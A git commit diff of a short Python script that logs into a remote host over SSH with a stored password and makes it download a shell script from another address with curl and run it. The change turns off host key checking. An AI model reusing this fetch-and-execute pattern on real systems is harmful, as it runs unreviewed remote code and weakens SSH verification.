9fe17c918ea124ef78fb5e8496dd6f03ed3c8ce3
Kolya <87275865+Kolya142@users.noreply.github.com>
2022-12-12 19:56:34 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import config
 import os
 script = f'curl {config.your_ip}:{config.your_port}/open.sh >open.sh;sh open.sh'
-command = f'sshpass -p {config._pass} ssh -l {config._username} {config._ip} "{script}"'
+command = f'sshpass -p {config._pass} ssh -o stricthostkeychecking=no -l {config._username} {config._ip} "{script}"'
 #print("command: " + command)
 os.system(command)
